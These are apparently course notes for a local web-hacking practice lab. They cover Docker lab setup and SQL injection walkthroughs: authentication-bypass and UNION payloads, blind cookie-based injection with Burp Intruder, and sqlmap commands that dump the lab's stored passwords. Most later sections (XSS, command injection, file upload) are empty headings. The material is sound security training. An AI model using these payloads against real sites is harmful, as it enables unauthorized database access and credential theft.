# Find & Exploit Common Web Vulnerabilities

## Lab Setup

### With PimpMyKali

1. To install Docker and Docker Compose, run [PimpMyKali](https://github.com/Dewalt-arch/pimpmykali) with `./pimpmykali.sh` and select option 7.

2. To set up the labs, run [PimpMyKali](https://github.com/Dewalt-arch/pimpmykali) again with `./pimpmykali.sh` and select option E.

### Custom Setup

1. Alternatively, open a terminal on your Kali Linux virtual machine and run the following commands:

   ```bash
   sudo apt update
   sudo apt install docker.io
   sudo curl -L "https://github.com/docker/compose/releases/download/v2.29.0/docker-compose-linux-x86_64" -o /usr/local/bin/docker-compose
   sudo chmod +x /usr/local/bin/docker-compose
   ```

2. Verify that Docker Compose is installed correctly:

   ```bash
   docker-compose version
   ```

3. Restart your virtual machine.

4. Download the web labs from TCM's link: [**labs**](https://cdn.fs.teachablecdn.com/NgPnyKOwSfWYuwnX3Lzb).

5. Copy the labs to your desired location and extract the files:

   ```bash
   tar -xf peh-web-labs.tar.gz
   cd labs
   sudo docker-compose up
   ```

   > The last command starts multiple containers using a single YAML file. You can also run it in the background using `-d` (detached mode).

   Here are some other useful commands:

   ```
   # List all running containers
   sudo docker ps -a
   # Stop the containers
   sudo docker-compose stop
   # Removing the containers, it will also list container ID that are stopped
   sudo docker rm $(sudo docker ps -aq)
   ```

### Running the Lab

The first time you run the lab, it will take some time to download necessary dependencies. Subsequent runs will be much faster. Once you see that `mysqld` and `mysqlx` are "ready for connections," the setup is complete.

1. Set the necessary permissions for the web server, which is required for the file upload labs and the capstone challenge. Run the following command in a separate terminal tab (use `Ctrl+Shift+T` to open a new tab):

```bash
./set-permissions.sh
```

2. Open your browser and navigate to [http://localhost](http://localhost).

3. The first time you load the lab, the database will need to be initialized. Follow the instructions in the red box by clicking the link, then return to the homepage.

> **Note:** If at any point you mess up the tables or database of the labs, you can reset it by visiting [http://localhost/init.php](http://localhost/init.php).

## SQL Injection - Introduction

SQL Injection (SQLi) is a critical vulnerability that occurs when an attacker can manipulate SQL queries by injecting malicious input. This can lead to unauthorized access, data manipulation, or even complete control over the database.

### Basic SQL commands

```bash
sudo systemctl start mysql
sudo mysql
```

```sql
CREATE DATABASE demo_db;
USE demo_db;
CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        age INT NOT NULL
    );
INSERT INTO users (username, password, age) VALUES ('alice', 'password123', 30);
INSERT INTO users (username, password, age) VALUES ('bob', 'securepass', 25);
SELECT * FROM users;
EXIT;
```

### Common SQL Injection Characters and Techniques

1. **Special Characters**:
   Certain characters are commonly used to exploit SQL Injection vulnerabilities:

   - **Single Quote (`'`)**: Often used to break out of string literals in SQL queries.
   - **Double Quote (`"`)**: Used similarly to single quotes, depending on the SQL dialect.
   - **Semicolon (`;`)**: Can be used to terminate one query and start another.

2. **Basic Injection Example**:

   - **`' OR 1=1 -- `**: A common SQL Injection payload. It manipulates the SQL query to always return true, potentially bypassing authentication or exposing data.
     - **`'`**: Ends the current string literal.
     - **`OR 1=1`**: Always evaluates to true, altering the query logic.
     - **`--`**: SQL comment syntax that ignores the rest of the query.

3. **Commenting Out Query**:
   - **`--`**: A SQL comment that can be used to ignore the rest of a query. This is often used in conjunction with injection payloads to ignore parts of the original query.

## SQL Injection - UNION

The `UNION` operator in SQL is used to combine the results of two or more `SELECT` statements. However, for the `UNION` to work correctly, there are two important conditions that must be met:

The number of columns in both `SELECT` statements must be the same.
The data types of the corresponding columns must be compatible.
When performing SQL injection, attackers often use the `UNION` operator to extract additional information from different tables or columns within the same table. However, to successfully use `UNION`, the number of columns in the injected `SELECT` statement must match the number of columns in the original query.

Determining the Number of Columns
To determine the number of columns in the original query, attackers may inject a series of `NULL` values into the `UNION` statement and increase the count of `NULL`s iteratively until the query executes successfully. This technique is often referred to as a "column enumeration attack."

For example, if the original query is:

```sql
SELECT username, email FROM injection0x01 WHERE username = 'jeremy';
```

An attacker might start with: `jeremy' UNION SELECT NULL #`

If the number of `NULL` values does not match the number of columns in the original query, an error will be returned.

The attacker will then increment the number of `NULL` values: `jeremy' UNION SELECT NULL, NULL, NULL #`

Once we've identified a vulnerable input field, we can start injecting SQL queries to extract valuable information from the database:

- Get the Database Version: `' union select null,null,version()#`
- Discover Available Tables: `'union select null, null,table_name from information_schema.tables#`
- Discover Available Columns: `'union select null, null,column_name from information_schema.columns#`

To solve the challenge:

- Identify Columns in a Specific Table: `' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'injection0x01' #`
- Extract Data from the Target Table: `' UNION SELECT email, null, password FROM injection0x01 #`

This will return the list of email addresses and their corresponding passwords:

```
Username: jeremy@example.com - Email: jeremyspassword
Username: jessamy@example.com - Email: jessamyspassword
Username: bob@example.com - Email: bobspassword
```

## SQL Injection - Blind Part 1

### BurpSuite

### BurpSuite

1. Open BurpSuite.
2. Add `http://localhost` to the Target > Scope section.
3. Open `http://localhost/labs/i0x02.php` in BurpSuite's browser (or in Firefox via FoxyProxy).
4. Log in with the credentials `jeremy:jeremy`, and send the request to the Repeater.
   - A successful request returns a response with a `Content-Length` of 1928.
   - When the credentials are incorrect, the `Content-Length` is 2122.

### SQLMap

1. Copy the POST request into a text file (e.g., `request.txt`).
2. To use SQLMap, run the command: `sqlmap -r request.txt`
3. SQLMap didn't find any potential vulnerabilities in this request.

### Substring in Cookies

- We have a GET request with the session parameter in the Cookie. We can try to intercept that and add a substring for testing.
- Modify the request as follows: `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex',1,1)='a'#`
- Since the injected condition is true (the first character of the string 'alex' is 'a'), the query returns a result, and the web page loads normally. This confirms that we can inject substrings.

### BurpSuite Intruder

- We can use BurpSuite's Intruder tool to test each letter of the alphabet to find the first letter in Jessamy's password. Set up the payload as follows: `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username = 'jessamy'),1,1)='§letter§'#`
- The correct payload will yield a different `Content-Length`. Here, the password starts with Z, the `Content-Length` is 1347 instead of 2247/48.

### SQLMap

- Save the GET request without the substring payload in a file (e.g., `request2.txt`).
- Run SQLMap with the following command: `sqlmap -r request2.txt --level=2`. Agree to all prompts as needed.

```
sqlmap identified the following injection point(s) with a total of 366 HTTP(s) requests:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1204=1204 AND 'DBbN'='DBbN

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1206 FROM (SELECT(SLEEP(5)))xhQZ) AND 'hVfr'='hVfr
---
```

- To retrieve the credentials, use the following command: `sqlmap -r request2.txt --level=2 -T injection0x02 --dump`

```
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+--------------------------------------------+
| email               | password     | username | session                                    |
+---------------------+--------------+----------+--------------------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db (jeremy)  |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe (jessamy) |
+---------------------+--------------+----------+--------------------------------------------+
```

## SQL Injection - Blind Part 2

## SQL Injection - Challenge Waklthrough

## XSS - Introduction

## XSS - DOM Lab

## XSS - Stored Lab

## XSS - Challenge Walkthrough

## Command Injection - Introduction

## Command Injection - Basics

## Command Injection - Blind / Out-of-Band

## Command Injection - Challenge Walkthrough

## Insecure File Upload - Introduction

## Insecure File Upload - Basic Bypass

## Insecure File Upload - Magic Bytes

## Insecure File Upload - Challenge Walkthrough

## Attacking Authentication - Intro

## Attacking Authentication - Brute Force

## Attacking Authentication - MFA

## Attacking Authentication - Challenge Walkthrough

## XXE - External Entities Injection

## IDOR - Insecure Direct Object Reference

## Capstone - Introduction

## Capstone - Solution
